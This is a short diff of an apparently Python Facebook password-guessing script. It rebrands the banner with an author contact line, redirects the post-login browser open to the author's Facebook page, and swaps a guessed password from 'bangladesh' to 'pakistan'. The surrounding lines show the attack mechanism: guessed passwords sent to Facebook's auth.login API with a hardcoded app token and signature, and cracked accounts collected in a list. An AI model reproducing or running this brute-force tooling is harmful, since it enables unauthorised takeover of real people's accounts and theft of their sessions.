@@ -73,7 +73,7 @@ logo='''
 
 \033[1;91m☞ Auther     : Bilal Safdar✅
 \033[1;92m☞ Facebook : https://www.facebook.com/bilal.safdar.5437
-\033[1;95m☞ 
+\033[1;95m☞ Contact: 03339322..3
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                 '''
@@ -104,7 +104,7 @@ def login():
 		    st.write(z["access_token"])
 		    st.close()
 		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
-		    os.system('xdg-open https://youtu.be/KvfnSttarOo')
+		    os.system('xdg-open https://www.facebook.com/bilal.safdar.5437 ')
 		    menu()
 		else:
 		    if "www.facebook.com" in z["error_msg"]:
@@ -323,7 +323,7 @@ def pb():
 			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
 			                                oks.append(user+ps4)
 			                            else:
-			                                ps5=('bangladesh')
+			                                ps5=('pakistan')
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
